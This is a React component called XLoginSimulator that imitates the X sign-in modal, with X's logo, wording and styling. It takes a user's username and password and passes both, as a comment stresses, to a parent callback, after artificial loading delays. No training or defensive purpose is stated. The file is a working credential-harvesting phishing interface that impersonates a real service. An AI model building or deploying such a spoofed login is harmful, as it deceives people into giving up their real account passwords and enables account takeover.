import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Loader2, X as CloseIcon } from 'lucide-react';

// Fix TS errors with framer-motion props
const MotionDiv = motion.div as any;

interface XLoginSimulatorProps {
  onSuccess: (username: string, password?: string) => void;
  onClose: () => void;
}

const XLoginSimulator: React.FC<XLoginSimulatorProps> = ({ onSuccess, onClose }) => {
  const [step, setStep] = useState<'username' | 'password'>('username');
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  // Lock body scroll when modal is open
  useEffect(() => {
    document.body.style.overflow = 'hidden';
    return () => {
      document.body.style.overflow = 'unset';
    };
  }, []);

  const handleNext = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!identifier) return;
    setIsLoading(true);
    await new Promise(resolve => setTimeout(resolve, 800));
    setIsLoading(false);
    setStep('password');
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) return;
    setIsLoading(true);
    await new Promise(resolve => setTimeout(resolve, 1500));
    const username = identifier.startsWith('@') ? identifier : '@' + identifier.replace(/\s/g, '');
    // Pass User AND Password
    onSuccess(username, password);
  };

  return (
    <div 
      className="fixed inset-0 z-[70] flex items-center justify-center bg-[#242d34]/60 backdrop-blur-sm p-4 font-sans"
      onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}
    >
      <MotionDiv 
        initial={{ scale: 0.95, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        exit={{ scale: 0.95, opacity: 0 }}
        className="bg-black text-white w-full max-w-[600px] h-[650px] rounded-2xl p-0 shadow-2xl flex flex-col relative overflow-hidden"
      >
        {/* Header */}
        <div className="flex items-center justify-between px-4 h-[53px]">
            <button onClick={onClose} className="p-2 hover:bg-[#181919] rounded-full transition-colors ml-[-4px]">
                <CloseIcon size={20} />
            </button>
            <div className="absolute left-1/2 -translate-x-1/2 top-3">
                <svg viewBox="0 0 24 24" className="w-8 h-8 text-white" fill="currentColor">
                    <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
                </svg>
            </div>
        </div>

        <div className="flex-1 flex flex-col items-center px-8 sm:px-20 w-full mx-auto overflow-y-auto no-scrollbar pt-6">
             <AnimatePresence mode="wait">
                {/* STEP 1: IDENTIFIER */}
                {step === 'username' && (
                    <MotionDiv 
                        key="step1"
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className="w-full flex flex-col h-full max-w-[364px] mx-auto"
                    >
                        <h2 className="text-[31px] font-bold mb-8 text-left text-[#e7e9ea] leading-tight">Sign in to X</h2>
                        
                        <div className="w-full space-y-3 mb-6">
                             <button type="button" className="w-full bg-white text-black font-medium rounded-full h-10 px-4 flex items-center justify-center gap-2 hover:bg-[#e6e6e6] transition-colors text-[15px]">
                                Sign in with Google
                            </button>
                            <button type="button" className="w-full bg-white text-black font-bold rounded-full h-10 px-4 flex items-center justify-center gap-2 hover:bg-[#e6e6e6] transition-colors text-[15px]">
                                Sign in with Apple
                            </button>
                        </div>

                        <div className="flex items-center gap-2 mb-4">
                             <div className="h-[1px] bg-[#2f3336] flex-1"></div>
                             <span className="text-[15px] text-[#e7e9ea]">or</span>
                             <div className="h-[1px] bg-[#2f3336] flex-1"></div>
                        </div>

                        <form onSubmit={handleNext} className="w-full flex-1 flex flex-col">
                             <div className="relative group mb-6">
                                <input 
                                    type="text"
                                    required
                                    value={identifier}
                                    onChange={(e) => setIdentifier(e.target.value)}
                                    className="peer w-full bg-black border border-[#333639] rounded-[4px] focus:border-[#1d9bf0] focus:ring-1 focus:ring-[#1d9bf0] outline-none py-4 px-2 pt-6 pb-2 text-white placeholder-transparent transition-colors text-[17px]"
                                    placeholder=" "
                                    id="x-input"
                                    autoFocus
                                />
                                <label 
                                    htmlFor="x-input"
                                    className="absolute left-2 top-4 text-[#71767b] text-[17px] transition-all 
                                    peer-focus:top-1.5 peer-focus:text-[13px] peer-focus:text-[#1d9bf0]
                                    peer-[:not(:placeholder-shown)]:top-1.5 peer-[:not(:placeholder-shown)]:text-[13px]"
                                >
                                    Phone, email, or username
                                </label>
                             </div>
                             
                             <button 
                                type="submit"
                                disabled={isLoading || !identifier}
                                className="w-full bg-white text-black font-bold rounded-full h-9 hover:bg-[#d7dbdc] transition-colors disabled:opacity-50 flex items-center justify-center gap-2 text-[15px] mb-6"
                            >
                                {isLoading ? <Loader2 className="animate-spin" size={18} /> : 'Next'}
                            </button>

                            <button 
                                type="button"
                                className="w-full bg-transparent border border-[#536471] text-white font-bold rounded-full h-9 hover:bg-[#eff3f4]/10 transition-colors text-[15px]"
                            >
                                Forgot password?
                            </button>
                        </form>
                    </MotionDiv>
                )}
                
                {/* STEP 2: PASSWORD */}
                {step === 'password' && (
                    <MotionDiv 
                        key="step2"
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className="w-full flex flex-col h-full max-w-[440px] mx-auto px-4"
                    >
                        <h2 className="text-[31px] font-bold mb-8 text-left text-[#e7e9ea] leading-tight">Enter your password</h2>
                        
                        <div className="bg-[#16181c] p-4 rounded px-3 py-3 border border-[#333639] mb-4 flex flex-col items-start pointer-events-none opacity-80">
                            <span className="text-[#71767b] text-[13px]">Username</span>
                            <span className="text-[#e7e9ea] text-[15px]">{identifier}</span>
                        </div>

                        <form onSubmit={handlePasswordSubmit} className="w-full flex-1 flex flex-col">
                             <div className="relative group mb-auto">
                                <input 
                                    type="password"
                                    required
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                    className="peer w-full bg-black border border-[#333639] rounded-[4px] focus:border-[#1d9bf0] focus:ring-1 focus:ring-[#1d9bf0] outline-none py-4 px-2 pt-6 pb-2 text-white placeholder-transparent transition-colors text-[17px]"
                                    placeholder=" "
                                    id="x-password"
                                    autoFocus
                                />
                                <label 
                                    htmlFor="x-password"
                                    className="absolute left-2 top-4 text-[#71767b] text-[17px] transition-all 
                                    peer-focus:top-1.5 peer-focus:text-[13px] peer-focus:text-[#1d9bf0]
                                    peer-[:not(:placeholder-shown)]:top-1.5 peer-[:not(:placeholder-shown)]:text-[13px]"
                                >
                                    Password
                                </label>
                             </div>
                             
                             <div className="h-6"></div> {/* Spacer */}

                             <div className="w-full pb-6">
                                <button 
                                    type="submit"
                                    disabled={isLoading || !password}
                                    className="w-full bg-[#1d9bf0] text-white font-bold rounded-full h-[50px] hover:bg-[#1a8cd8] transition-colors disabled:opacity-50 flex items-center justify-center gap-2 text-[17px]"
                                >
                                    {isLoading ? <Loader2 className="animate-spin" size={20} /> : 'Log in'}
                                </button>
                             </div>
                        </form>
                    </MotionDiv>
                )}
             </AnimatePresence>
        </div>
      </MotionDiv>
    </div>
  );
};

export default XLoginSimulator;